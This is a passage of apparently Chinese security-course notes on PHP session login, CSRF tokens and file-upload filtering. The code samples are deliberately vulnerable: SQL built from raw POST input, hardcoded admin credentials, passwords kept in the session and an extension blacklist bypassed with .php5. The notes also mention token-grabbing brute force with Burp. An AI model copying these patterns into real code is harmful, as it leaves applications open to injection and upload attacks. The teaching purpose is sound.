2.判断账号密码是否正确</span><br><span class="line"> * 3.正确后生成cookie进行保存</span><br><span class="line"> * 4.错误的账户密码进行提示</span><br><span class="line"> * 5.跳转至成功页面</span><br><span class="line"> */</span><br><span class="line">//1.接收输入账号密码</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">user=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">pass=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span></span><br><span class="line">//2.进行判断账号密码是否正确</span><br><span class="line">// 构建 SQL 查询语句，用于判断账号密码是否正确</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sql = <span class="string">&quot;SELECT * FROM admin WHERE username=&#x27;<span class="variable">$user</span>&#x27; AND password=&#x27;<span class="variable">$pass</span>&#x27;;&quot;</span>;</span></span><br><span class="line">//echo $sql;</span><br><span class="line"></span><br><span class="line">// 执行 SQL 查询</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">data = mysqli_query(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span></span><br><span class="line"></span><br><span class="line">// 判断请求是否为 POST</span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123;</span><br><span class="line">    // 检查查询结果行数是否大于 0</span><br><span class="line">    if (mysqli_num_rows($data) &gt; 0) &#123;</span><br><span class="line">        session_start();</span><br><span class="line">        $_SESSION[&#x27;username&#x27;]=$user;</span><br><span class="line">        $_SESSION[&#x27;password&#x27;]=$pass;</span><br><span class="line"></span><br><span class="line">        // 重定向到 index-c.php 页面</span><br><span class="line">        header(&#x27;Location: index-s.php&#x27;);</span><br><span class="line">        exit();  // 终止脚本执行</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;登录失败！&#x27;)&lt;/script&gt;&quot;; // 输出登录失败的提示</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>index-s.php</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//登入界面文件,使用session验证</span><br><span class="line">&lt;?php</span><br><span class="line">//登录成功首页文件-采用session验证</span><br><span class="line">//判断省去了数据库查询获取帐号密码的操作 直接赋值</span><br><span class="line">session_start();</span><br><span class="line"><span class="meta prompt_">if($</span><span class="language-bash">_SESSION[<span class="string">&#x27;username&#x27;</span>]!=<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>]!=<span class="string">&#x27;123456&#x27;</span>)&#123;</span></span><br><span class="line">    header(&#x27;Location: admin-s.php&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;后台首页&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;后台首页&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;欢迎您，&lt;?php echo $_SESSION[&#x27;username&#x27;]; ?&gt;！&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;a href=&quot;logout-s.php&quot;&gt;退出登录&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>logout-s.php</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//登出文件,使用session验证</span><br><span class="line">// 开始会话</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">// 清除 SESSION 变量，并销毁会话</span><br><span class="line">session_unset();</span><br><span class="line">session_destroy();</span><br><span class="line"></span><br><span class="line">// 重定向到登录页面</span><br><span class="line">header(&#x27;Location: admin-s.php&#x27;);</span><br><span class="line">exit;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>在登录界面进行测试时，会发现\phpstudy_pro\Extensions\tmp\tmp产生文件（登录成功后）</p>
<p>username|s:5:”admin”;password|s:6:”123456”;</p>
<p>查看网站cookie信息</p>
<p><img src="/img/xiaodi/image-20250514204155298.png" alt="image-20250514204155298"></p>
<p>会话劫持：会话劫持是指攻击者通过窃取合法用户的会话标识符（如会话ID或令牌）来冒充用户身份。为了防止会话劫持，应采取以下措施：<br>    使用随机生成的、复杂的会话标识符，使其难以猜测。<br>    在会话标识符上实施安全标志，如”Secure”和”HttpOnly”，以限制Cookie的使用范围。<br>    在用户身份验证过程中使用额外的保护措施，如双因素身份验证。</p>
<p>会话固定攻击：会话固定攻击是指攻击者通过将自己的会话标识符强制应用于目标用户的会话来控制目标用户的会话。为了防止会话固定攻击，应采取以下措施：<br>    在用户认证之前生成新的会话标识符，而不是在认证后重新使用现有的会话标识符。<br>    在用户身份验证之前销毁旧会话，以确保新会话的安全性。</p>
<p>跨站点脚本攻击（XSS）：XSS攻击可以窃取用户会话数据或以其他方式干扰会话。为了防止XSS攻击，应采取以下措施：<br>    对用户输入进行正确的验证和过滤，以防止恶意脚本的注入。<br>    对输出进行适当的转义，以防止恶意脚本在浏览器中执行。</p>
<p>跨站点请求伪造（CSRF）：CSRF攻击可以利用用户的身份执行未经授权的操作。为了防止CSRF攻击，应采取以下措施：<br>    使用随机生成的、唯一的CSRF令牌来验证每个请求的合法性。<br>    将CSRF令牌嵌入到表单中，并在每个请求中验证令牌的有效性。</p>
<p>会话超时和注销：应设定适当的会话超时时间，以确保长时间不活动的会话被及时注销。同时，提供明确的注销功能，使用户可以主动终止会话。</p>
<h3 id="Token技术"><a href="#Token技术" class="headerlink" title="Token技术"></a>Token技术</h3><p>1、生成Token并将其存储在Session<br>2、生成Token并将其绑定在Cookie触发<br>3、尝试登录表单中带入Token验证逻辑<br>4、思考Token安全特性</p>
<h4 id="创建php文件-2"><a href="#创建php文件-2" class="headerlink" title="创建php文件"></a>创建php文件</h4><p>token.php</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 生成Token并将其存储在Session中</span><br><span class="line">session_start();</span><br><span class="line">//1.因为是用的session维持会话，token已经绑定到下面的表单了</span><br><span class="line">//2.token，生成之后直接存到session里，主要是方便重置token,</span><br><span class="line">//每次token随表单提交后都需要重置以保持token的唯一性。</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_SESSION[<span class="string">&#x27;token&#x27;</span>] = bin2hex(random_bytes(16));</span></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;后台登录&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            background-color: #f1f1f1;</span><br><span class="line">        &#125;</span><br><span class="line">        .login &#123;</span><br><span class="line">            width: 400px;</span><br><span class="line">            margin: 100px auto;</span><br><span class="line">            background-color: #fff;</span><br><span class="line">            border-radius: 5px;</span><br><span class="line">            box-shadow: 0 0 10px rgba(0,0,0,0.3);</span><br><span class="line">            padding: 30px;</span><br><span class="line">        &#125;</span><br><span class="line">        .login h2 &#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            font-size: 2em;</span><br><span class="line">            margin-bottom: 30px;</span><br><span class="line">        &#125;</span><br><span class="line">        .login label &#123;</span><br><span class="line">            display: block;</span><br><span class="line">            margin-bottom: 20px;</span><br><span class="line">            font-size: 1.2em;</span><br><span class="line">        &#125;</span><br><span class="line">        .login input[type=&quot;text&quot;], .login input[type=&quot;password&quot;] &#123;</span><br><span class="line">            width: 100%;</span><br><span class="line">            padding: 10px;</span><br><span class="line">            border: 1px solid #ccc;</span><br><span class="line">            border-radius: 5px;</span><br><span class="line">            font-size: 1.2em;</span><br><span class="line">            margin-bottom: 20px;</span><br><span class="line">        &#125;</span><br><span class="line">        .login input[type=&quot;submit&quot;] &#123;</span><br><span class="line">            background-color: #2ecc71;</span><br><span class="line">            color: #fff;</span><br><span class="line">            border: none;</span><br><span class="line">            padding: 10px 20px;</span><br><span class="line">            border-radius: 5px;</span><br><span class="line">            font-size: 1.2em;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">        &#125;</span><br><span class="line">        .login input[type=&quot;submit&quot;]:hover &#123;</span><br><span class="line">            background-color: #27ae60;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;login&quot;&gt;</span><br><span class="line">    &lt;h2&gt;后台登录&lt;/h2&gt;</span><br><span class="line">    &lt;!-- 提交表单到 &quot;token_check.php&quot;，使用 POST 方法 --&gt;</span><br><span class="line">    &lt;form action=&quot;token_check.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        &lt;!-- 隐藏域用于存储 CSRF token --&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;&lt;?php echo $_SESSION[&#x27;token&#x27;] ; ?&gt;&quot;&gt;</span><br><span class="line">        &lt;label for=&quot;username&quot;&gt;用户名:&lt;/label&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; required&gt;</span><br><span class="line">        &lt;label for=&quot;password&quot;&gt;密码:&lt;/label&gt;</span><br><span class="line">        &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; required&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>token_check.php</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">// 从 POST 请求中获取 token，如果不存在则设为空字符串</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">token = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"></span><br><span class="line">if ($token !== $_SESSION[&#x27;token&#x27;]) &#123;</span><br><span class="line">    // token不匹配，禁止访问</span><br><span class="line">    header(&#x27;HTTP/1.1 403 Forbidden&#x27;);</span><br><span class="line">    // 生成新的 token</span><br><span class="line">    $_SESSION[&#x27;token&#x27;] = bin2hex(random_bytes(16));</span><br><span class="line">    // 输出访问被拒绝的信息</span><br><span class="line">    echo &#x27;Access denied&#x27;;</span><br><span class="line">    // 终止脚本执行</span><br><span class="line">    exit;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    // 生成新的 token</span><br><span class="line">    $_SESSION[&#x27;token&#x27;] = bin2hex(random_bytes(16));</span><br><span class="line">    // 检查用户名和密码是否匹配</span><br><span class="line">    if($_POST[&#x27;username&#x27;]==&#x27;admin&#x27; &amp;&amp; $_POST[&#x27;password&#x27;]==&#x27;123456&#x27;)&#123;</span><br><span class="line">        echo &#x27;登录成功!&#x27;;</span><br><span class="line">        // 输出管理员访问信息</span><br><span class="line">        echo &#x27;你是管理员可以访问文件管理页面！&#x27;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;登录失败！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<p>知识总结：</p>
<p>​	token是防御csrf的有效方式，但是在小迪安全课程中，介绍到也是防止暴力破解的措施，这一点可能有所欠妥，使用burp中的inruder模块的”定义提取grep项目”功能既可以实现抓取token，从而实现暴力破解</p>
<p>用户身份验证<br>    Token 最常见的用途是进行用户身份验证。例如，当用户登录时，服务器通过验证用户名和密码，生成一个 Token，返回给客户端。在之后的请求中，客户端将该 Token 附加到请求中，服务器通过验证 Token 确认用户身份，并授权访问相关资源。</p>
<p>授权控制<br>    Token 不仅包含身份信息，还可以包含关于用户角色、权限等信息。因此，服务器可以根据 Token 中的数据来判断用户是否有权访问某些资源。例如，后台管理系统可能基于 Token 中的角色信息来决定用户是否有权限访问管理页面或执行管理操作。</p>
<p>防止跨站请求伪造（CSRF）<br>    传统的基于 Cookie 的身份认证机制容易受到 CSRF（跨站请求伪造）攻击，因为攻击者可以诱导用户访问恶意网站，从而利用用户的身份信息发起请求。而 Token 认证通过将身份信息存储在客户端，并通过 HTTP 请求头传递（而非通过 Cookie），从而有效防止了 CSRF 攻击。</p>
<p>跨域认证<br>    在现代的前后端分离架构中，前端和后端通常分布在不同的域名下。Token 认证非常适合跨域认证，因为 Token 是通过 HTTP 请求头传递的，不受浏览器的跨域限制。因此，Token 机制可以方便地用于跨域认证。</p>
<h2 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h2><p>PHP应用&amp;文件管理模块&amp;显示上传&amp;黑白名单类型过滤&amp;访问控制</p>
<h3 id="PHP文件管理-显示-上传功能实现"><a href="#PHP文件管理-显示-上传功能实现" class="headerlink" title="PHP文件管理-显示&amp;上传功能实现"></a><strong>PHP文件管理-显示&amp;上传功能实现</strong></h3><p>文件上传的过滤机制</p>
<blockquote>
<p>1、无过滤机制<br>2、黑名单过滤机制<br>3、白名单过滤机制<br>4、文件类型过滤机制</p>
</blockquote>
<p>PHP中接收文件信息方法</p>
<blockquote>
<p>$_FILES：PHP中一个预定义的超全局变量，用于在上传文件时从客户端接收文件，并将其保存到服务器上。它是一个包含上传文件信息的数组，包括文件名、类型、大小、临时文件名等信息。<br>$_FILES[“表单值”][“name”] 获取上传文件原始名称<br>$_FILES[“表单值”][“type”] 获取上传文件MIME类型<br>$_FILES[“表单值”][“size”] 获取上传文件字节单位大小<br>$_FILES[“表单值”][“tmp_name”] 获取上传的临时副本文件名<br>$_FILES[“表单值”][“error”] 获取上传时发生的错误代码<br>move_uploaded_file() 将上传的文件移动到指定位置的函数</p>
</blockquote>
<h4 id="文件上传功能实现"><a href="#文件上传功能实现" class="headerlink" title="文件上传功能实现"></a><strong>文件上传功能实现</strong></h4><p>创建upload.php和upload.html</p>
<p>upload.html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 提交表单到 &quot;upload.php&quot;，使用 POST 方法，并启用文件上传功能 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 用于标识上传文件的标签 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>选择文件:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 文件输入框，允许用户选择要上传的文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;f&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 提交按钮，触发文件上传操作 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>上传文件<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意：**<code>enctype=&quot;multipart/form-data&quot;</code>** 告诉服务器，表单中包含了文件上传的数据，并且服务器需要以<strong>二进制格式</strong>解析这些数据。这样可以确保文件等二进制数据能够<strong>正确地传输到服务器</strong>。</p>
<p>upload.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从上传文件数组中获取文件名</span></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;f&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="comment">// 从上传文件数组中获取文件类型</span></span><br><span class="line"><span class="variable">$type</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;f&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="comment">// 从上传文件数组中获取文件大小</span></span><br><span class="line"><span class="variable">$size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;f&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line"><span class="comment">// 从上传文件数组中获取临时文件名</span></span><br><span class="line"><span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;f&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="comment">// 从上传文件数组中获取错误码</span></span><br><span class="line"><span class="variable">$error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;f&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出文件名</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 输出文件类型</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$type</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 输出文件大小</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$size</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 输出临时文件名</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$tmp_name</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 输出错误码</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$error</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 如果成功将临时文件移动到指定目录，则输出文件上传成功</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="string">&#x27;upload/&#x27;</span> . <span class="variable">$name</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件上传成功!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<p><img src="/img/xiaodi/image-20250515200904334.png" alt="image-20250515200904334"></p>
<h4 id="黑名单过滤机制"><a href="#黑名单过滤机制" class="headerlink" title="黑名单过滤机制"></a>黑名单过滤机制</h4><blockquote>
<ul>
<li>使用 explode 函数通过点号分割文件名，获取文件后缀</li>
<li>使用 end 函数获取数组中的最后一个元素，即文件后缀</li>
<li>检查文件后缀是否在黑名单中<ul>
<li>如果文件后缀在黑名单中，输出非法后缀文件信息</li>
<li>如果文件后缀不在黑名单中，移动上传的文件到指定目录</li>
<li>输出上传成功的提示信息</li>
</ul>
</li>
</ul>
</blockquote>
<p>实现机制</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 上传文件后缀过滤，使用黑名单机制</span></span><br><span class="line"><span class="variable">$black_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;jsp&#x27;</span>, <span class="string">&#x27;aspx&#x27;</span>);</span><br><span class="line"><span class="comment">// 使用 explode 函数通过点号分割文件名，获取文件后缀</span></span><br><span class="line"><span class="variable">$fenge</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line"><span class="comment">// 使用 end 函数获取数组中的最后一个元素，即文件后缀</span></span><br><span class="line"><span class="variable">$exts</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$fenge</span>);</span><br><span class="line"><span class="comment">// 检查文件后缀是否在黑名单中</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$exts</span>, <span class="variable">$black_ext</span>)) &#123;</span><br><span class="line">    <span class="comment">// 如果文件后缀在黑名单中，输出非法后缀文件信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;非法后缀文件&#x27;</span> . <span class="variable">$exts</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果文件后缀不在黑名单中，移动上传的文件到指定目录</span></span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="string">&#x27;upload/&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">    <span class="comment">// 输出上传成功的提示信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;上传成功！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>上传.php文件进行测试</p>
<p><img src="/img/xiaodi/image-20250515201448007.png" alt="image-20250515201448007"></p>
<p>问题：如果过滤机制的<strong>后缀名没有考虑其他限制</strong>如**<code>.php5</code><strong>之类的，还是可以进行</strong>绕过黑名单<strong>，</strong>正常进行上传和下载**</p>
<p><img src="/img/xiaodi/image-20250515201705008.png" alt="image-20250515201705008"></p>
<h4 id="白名单过滤机制"><a href="#白名单过滤机制" class="headerlink" title="白名单过滤机制"></a>白名单过滤机制</h4><blockquote>
<p>限制只允许上传的后缀</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//白名单过滤机制</span></span><br><span class="line"><span class="comment">// 允许上传的文件后缀白名单</span></span><br><span class="line"><span class="variable">$allow_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);</span><br><span class="line"><span class="comment">// 使用 explode 函数通过点号分割文件名，获取文件后缀</span></span><br><span class="line"><span class="variable">$fenge</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line"><span class="comment">// 使用 end 函数获取数组中的最后一个元素，即文件后缀</span></span><br><span class="line"><span class="variable">$exts</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$fenge</span>);</span><br><span class="line"><span class="comment">// 检查文件后缀是否在允许的白名单中</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$exts</span>, <span class="variable">$allow_ext</span>)) &#123;</span><br><span class="line">    <span class="comment">// 如果文件后缀不在白名单中，输出非法后缀文件信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;非法后缀文件&#x27;</span> . <span class="variable">$exts</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果文件后缀在白名单中，移动上传的文件到指定目录</span></span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="string">&#x27;upload/&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">    <span class="comment">// 输出上传成功的提示信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;上传成功！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>尝试上传PHP5文件</p>
<p><img src="/img/xiaodi/image-20250515201834156.png" alt="image-20250515201834156"></p>
<h4 id="文件类型过滤机制"><a href="#文件类型过滤机制" class="headerlink" title="文件类型过滤机制"></a>文件类型过滤机制</h4><blockquote>
<p>通过检测MIME机制来确认文件类型</p>
